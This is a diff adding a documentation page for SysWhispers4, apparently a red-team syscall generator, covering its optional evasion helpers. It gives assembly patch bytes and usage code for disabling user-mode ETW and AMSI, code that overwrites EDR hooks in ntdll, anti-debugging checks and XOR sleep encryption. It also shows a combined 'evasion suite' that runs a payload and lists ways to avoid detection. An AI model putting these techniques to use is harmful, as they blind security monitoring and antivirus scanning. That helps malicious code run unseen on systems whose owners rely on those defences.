@@ -1,0 +1,530 @@
+---
+title: Evasion Helper Functions
+description: Optional helper functions for AV/EDR bypass, unhooking, and anti-debugging
+---
+
+## Overview
+
+SysWhispers4 can generate optional evasion helper functions based on command-line flags. These functions patch, unhook, or detect security monitoring mechanisms.
+
+<Warning>
+  These functions are generated **only if** you use the corresponding command-line flags when running SysWhispers4.
+</Warning>
+
+## SW4_PatchEtw
+
+*Generated with: `--etw-bypass`*
+
+Patches `ntdll!EtwEventWrite` to suppress user-mode ETW (Event Tracing for Windows) event delivery.
+
+```c
+BOOL SW4_PatchEtw(VOID);
+```
+
+### Returns
+
+- `TRUE` — Successfully patched ETW
+- `FALSE` — Failed to patch (already patched, or protection error)
+
+### How It Works
+
+1. Locates `ntdll!EtwEventWrite` function
+2. Changes memory protection to `PAGE_EXECUTE_READWRITE`
+3. Overwrites first bytes with:
+   ```asm
+   xor eax, eax        ; Return 0 (success)
+   ret                 ; Immediate return
+   ```
+4. Restores original protection
+
+**Result:** All `EtwEventWrite()` calls return immediately without logging events.
+
+### Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    // Suppress ETW events
+    if (SW4_PatchEtw()) {
+        printf("[+] ETW patched\n");
+    } else {
+        fprintf(stderr, "[!] ETW patch failed\n");
+    }
+
+    // Perform operations without ETW telemetry
+    // ...
+}
+```
+
+### What ETW Bypass Does NOT Do
+
+<Warning>
+  This bypasses **user-mode ETW** only. It does **NOT** bypass:
+  
+  - **Kernel ETW-Ti** (Microsoft-Windows-Threat-Intelligence) — Fires inside kernel
+  - **Event logs** — Written via different mechanisms
+  - **Sysmon** — Uses kernel driver, not affected by user-mode patches
+</Warning>
+
+ETW-Ti callbacks fire in kernel space when syscalls are made, regardless of user-mode patching. This technique is useful against lighter EDRs that rely on user-mode ETW.
+
+---
+
+## SW4_PatchAmsi
+
+*Generated with: `--amsi-bypass`*
+
+Patches `amsi.dll!AmsiScanBuffer` to bypass AMSI (Antimalware Scan Interface) scanning.
+
+```c
+BOOL SW4_PatchAmsi(VOID);
+```
+
+### Returns
+
+- `TRUE` — Successfully patched AMSI (or amsi.dll not loaded)
+- `FALSE` — Failed to patch
+
+### How It Works
+
+1. Checks if `amsi.dll` is loaded in the process
+2. If not loaded, returns `TRUE` (nothing to patch)
+3. If loaded:
+   - Locates `AmsiScanBuffer` function
+   - Patches first bytes to return `E_INVALIDARG` (0x80070057)
+   - This makes AMSI think the scan arguments are invalid
+
+```asm
+; Patched AmsiScanBuffer:
+mov eax, 0x80070057    ; E_INVALIDARG
+ret
+```
+
+### Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    // Bypass AMSI before loading suspicious content
+    if (SW4_PatchAmsi()) {
+        printf("[+] AMSI bypassed\n");
+    }
+
+    // Now PowerShell, VBScript, JScript won't be scanned
+    // Load and execute scripts...
+}
+```
+
+### When to Call
+
+<Note>
+  Call `SW4_PatchAmsi()` **before** any operations that might trigger AMSI scanning:
+  
+  - Loading PowerShell scripts
+  - Executing .NET assemblies via CLR hosting
+  - Running VBScript/JScript
+  - Any file/buffer that AMSI-aware applications scan
+</Note>
+
+### Limitations
+
+- Only affects the current process
+- If `amsi.dll` isn't loaded yet, it won't be pre-patched (patch after first AMSI initialization)
+- Some applications re-verify AMSI integrity — patch may be detected
+
+---
+
+## SW4_UnhookNtdll
+
+*Generated with: `--unhook-ntdll`*
+
+Removes **all** inline hooks from `ntdll.dll` by mapping a clean copy from `\KnownDlls\ntdll.dll` and overwriting the `.text` section.
+
+```c
+BOOL SW4_UnhookNtdll(VOID);
+```
+
+### Returns
+
+- `TRUE` — Successfully unhooked ntdll
+- `FALSE` — Failed to unhook
+
+### How It Works
+
+1. Opens `\KnownDlls\ntdll.dll` section (clean, unhooked copy maintained by Windows)
+2. Maps the clean ntdll into process memory (`NtMapViewOfSection`)
+3. Locates the `.text` section in both clean and hooked ntdll
+4. Changes hooked ntdll `.text` protection to `PAGE_EXECUTE_READWRITE` (via `VirtualProtect`)
+5. Overwrites hooked `.text` with clean bytes (`memcpy`)
+6. Restores protection to `PAGE_EXECUTE_READ`
+7. Unmaps the clean ntdll
+
+**Result:** All EDR hooks (inline patches, trampolines) are removed.
+
+### Usage
+
+<Warning>
+  **CRITICAL:** Call `SW4_UnhookNtdll()` **BEFORE** `SW4_Initialize()` for best results.
+</Warning>
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // Step 1: Remove ALL hooks from ntdll FIRST
+    if (SW4_UnhookNtdll()) {
+        printf("[+] ntdll unhooked\n");
+    } else {
+        fprintf(stderr, "[!] Unhook failed\n");
+    }
+
+    // Step 2: NOW resolve SSNs from clean ntdll
+    if (!SW4_Initialize()) return 1;
+
+    // Step 3: Proceed with clean syscalls
+    // All EDR hooks are gone, SSNs are resolved from clean stubs
+    // ...
+}
+```
+
+### Why Unhook Before Initialize?
+
+If you're using dynamic SSN resolution (FreshyCalls, Hell's Gate, etc.), those methods read from ntdll:
+
+- **Before unhook:** They read hooked/modified stubs → may get wrong SSNs or fail
+- **After unhook:** They read clean stubs → correct SSNs
+
+For `--resolve static`, order doesn't matter (SSNs are embedded at compile time).
+
+### What Gets Unhooked
+
+All inline hooks in ntdll's `.text` section:
+
+- **E9 hooks** (near JMP)
+- **FF 25 hooks** (far JMP)
+- **Int3 breakpoints** (0xCC)
+- **Trampolines** (any modification to function prologue)
+
+### Limitations
+
+- Does **not** unhook kernel-mode hooks (syscall table hooks, SSDT hooks)
+- Does **not** remove IAT hooks (those are in your PE, not ntdll)
+- EDR may detect the unhooking operation itself
+- Only affects ntdll — other DLLs (kernel32, kernelbase) remain hooked
+
+---
+
+## SW4_AntiDebugCheck
+
+*Generated with: `--anti-debug`*
+
+Performs 6 anti-debugging checks to detect debuggers and analysis tools.
+
+```c
+BOOL SW4_AntiDebugCheck(VOID);
+```
+
+### Returns
+
+- `TRUE` — No debugger detected (safe to proceed)
+- `FALSE` — Debugger or analysis tool detected
+
+### Detection Techniques
+
+| Check | Technique | What It Detects |
+|-------|-----------|----------------|
+| 1 | `PEB.BeingDebugged` | Standard debugger attachment (user-mode) |
+| 2 | `PEB.NtGlobalFlag` | Heap debug flags set by debuggers |
+| 3 | `RDTSC` timing delta | Single-stepping / instruction tracing |
+| 4 | `NtQueryInformationProcess(ProcessDebugPort)` | Kernel debug port (kernel-mode debugging) |
+| 5 | Heap flags analysis | `HEAP_TAIL_CHECKING_ENABLED`, `HEAP_FREE_CHECKING_ENABLED` |
+| 6 | Instrumentation callback | ETI (Early Thread Instrumentation) used by EDRs |
+
+### Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    // Check for debuggers
+    if (!SW4_AntiDebugCheck()) {
+        // Debugger detected!
+        printf("[!] Debugger detected - exiting\n");
+        return 0;  // Or take evasive action
+    }
+
+    printf("[+] No debugger detected\n");
+
+    // Proceed with operations
+    // ...
+}
+```
+
+### Example: Continuous Monitoring
+
+```c
+while (1) {
+    if (!SW4_AntiDebugCheck()) {
+        // Debugger attached mid-execution
+        ExitProcess(0);
+    }
+
+    // Perform operations
+    DoSomething();
+
+    Sleep(1000);
+}
+```
+
+### Bypasses
+
+Sophisticated debuggers (x64dbg, WinDbg with plugins) can:
+
+- Clear `PEB.BeingDebugged` flag
+- Hide debug port
+- Normalize heap flags
+- Spoof RDTSC timing
+
+For production evasion, combine with:
+
+- Code obfuscation
+- Anti-tampering checks
+- Remote attestation
+
+---
+
+## SW4_SleepEncrypt
+
+*Generated with: `--sleep-encrypt`*
+
+**Ekko-style** memory encryption during sleep to evade periodic memory scanners.
+
+```c
+VOID SW4_SleepEncrypt(DWORD dwMilliseconds);
+```
+
+### Parameters
+
+<ParamField path="dwMilliseconds" type="DWORD" required>
+  Sleep duration in milliseconds (same as `Sleep()`).
+</ParamField>
+
+### How It Works
+
+1. Generates random XOR key via `RDTSC` (timestamp counter)
+2. XOR-encrypts own `.text` section (where your code lives)
+3. Creates a waitable timer with the specified duration
+4. Queues an APC to the current thread (decryption routine)
+5. Enters alertable sleep (`NtWaitForSingleObject` with alertable flag)
+6. Timer fires → APC executes → decrypts `.text`
+7. Execution resumes normally
+
+**During sleep:** Your code section is encrypted gibberish — signature scanners see random data.
+
+### Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    printf("[*] Performing operation...\n");
+    // ... do something ...
+
+    // Sleep with encryption (instead of Sleep(5000))
+    printf("[*] Sleeping with .text encryption...\n");
+    SW4_SleepEncrypt(5000);
+
+    printf("[+] Awake - .text decrypted\n");
+
+    // Continue execution
+    // ...
+}
+```
+
+### What It Defeats
+
+- **Periodic memory scanners** — EDRs that scan process memory every N seconds
+- **YARA signature scans** — Signatures won't match encrypted code
+- **In-memory PE analysis** — .text section appears corrupted
+
+### Limitations
+
+<Warning>
+  - **Single-threaded only** — If other threads are running, they'll crash when accessing encrypted code
+  - **Detectable by behavior** — Suspicious pattern: memory protection change + encryption
+  - **No protection while awake** — Code is decrypted during execution
+</Warning>
+
+### Implementation Notes
+
+The encryption is **symmetric XOR**, not cryptographically secure. It's meant for evasion, not secrecy.
+
+The APC decryption routine:
+
+```c
+void DecryptTextSection(PVOID key, PVOID base, SIZE_T size) {
+    ULONG_PTR xorKey = (ULONG_PTR)key;
+    for (SIZE_T i = 0; i < size; i++) {
+        ((BYTE*)base)[i] ^= (BYTE)(xorKey >> (i % 8));
+    }
+}
+```
+
+---
+
+## Complete Evasion Example
+
+Combining all evasion helpers:
+
+```c
+#include <stdio.h>
+#include "SW4Syscalls.h"
+
+int main(void) {
+    printf("[*] Initializing evasion suite...\n");
+
+    // Step 1: Remove all ntdll hooks (MUST be first)
+    if (SW4_UnhookNtdll()) {
+        printf("[+] ntdll unhooked\n");
+    }
+
+    // Step 2: Resolve SSNs (from now-clean ntdll)
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] Initialization failed\n");
+        return 1;
+    }
+    printf("[+] SSNs resolved\n");
+
+    // Step 3: Check for debuggers
+    if (!SW4_AntiDebugCheck()) {
+        printf("[!] Debugger detected - aborting\n");
+        return 0;
+    }
+    printf("[+] No debugger detected\n");
+
+    // Step 4: Patch ETW
+    if (SW4_PatchEtw()) {
+        printf("[+] ETW suppressed\n");
+    }
+
+    // Step 5: Patch AMSI
+    if (SW4_PatchAmsi()) {
+        printf("[+] AMSI bypassed\n");
+    }
+
+    printf("[+] All evasion measures active\n");
+
+    // Perform operations
+    printf("[*] Executing payload...\n");
+    // ... your code ...
+
+    // Use encrypted sleep
+    printf("[*] Sleeping with encryption...\n");
+    SW4_SleepEncrypt(3000);
+
+    printf("[+] Operations complete\n");
+    return 0;
+}
+```
+
+---
+
+## Generation Flags Reference
+
+| Helper Function | Command-Line Flag | Generated Files |
+|-----------------|-------------------|----------------|
+| `SW4_PatchEtw()` | `--etw-bypass` | Code in `SW4Syscalls.c` |
+| `SW4_PatchAmsi()` | `--amsi-bypass` | Code in `SW4Syscalls.c` |
+| `SW4_UnhookNtdll()` | `--unhook-ntdll` | Code in `SW4Syscalls.c` |
+| `SW4_AntiDebugCheck()` | `--anti-debug` | Code in `SW4Syscalls.c` |
+| `SW4_SleepEncrypt()` | `--sleep-encrypt` | Code in `SW4Syscalls.c` + ASM |
+
+### Example Generation Command
+
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --etw-bypass --amsi-bypass \
+    --unhook-ntdll --anti-debug --sleep-encrypt
+```
+
+This generates all evasion helpers plus maximum stealth syscall invocation.
+
+---
+
+## Detection Risks
+
+<Warning>
+  **EDRs may detect these evasion techniques:**
+  
+  - **Unhooking** — Kernel callbacks can detect `.text` section writes
+  - **ETW/AMSI patching** — Integrity checks, CRC validation
+  - **Sleep encryption** — Suspicious memory protection changes + wait patterns
+  - **Anti-debug** — Debugger-detection code itself is a red flag
+</Warning>
+
+### Mitigation Strategies
+
+1. **Obfuscate helper functions** — Use `--obfuscate` to add junk instructions
+2. **Delay evasion** — Don't unhook immediately at startup
+3. **Polymorphic patching** — Vary patch bytes each execution
+4. **Kernel-mode alternatives** — For production, consider kernel drivers (though riskier)
+
+---
+
+## Best Practices
+
+### Order of Operations
+
+```c
+// CORRECT order:
+1. SW4_UnhookNtdll();       // Remove hooks
+2. SW4_Initialize();         // Resolve SSNs from clean ntdll
+3. SW4_PatchEtw();          // Suppress telemetry
+4. SW4_PatchAmsi();         // Bypass scanning
+5. SW4_AntiDebugCheck();    // Verify clean environment
+6. /* Perform operations */
+7. SW4_SleepEncrypt(ms);    // Sleep safely
+```
+
+### Error Handling
+
+Always check return values:
+
+```c
+if (!SW4_UnhookNtdll()) {
+    // Unhook failed - possibly already detected
+    // Consider aborting or using fallback method
+}
+```
+
+### Testing
+
+Test evasion helpers in controlled environments:
+
+- **Static analysis:** Verify no plaintext strings remain
+- **Dynamic analysis:** Monitor with Process Hacker, API Monitor
+- **EDR testing:** Test against actual EDR products (in authorized labs)
+
+---
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Supported Functions" icon="list" href="/api/supported-functions">
+    Complete reference of all 64 NT syscall functions
+  </Card>
+  <Card title="Quickstart Guide" icon="rocket" href="/quickstart">
+    Get started with SysWhispers4
+  </Card>
+</CardGroup>
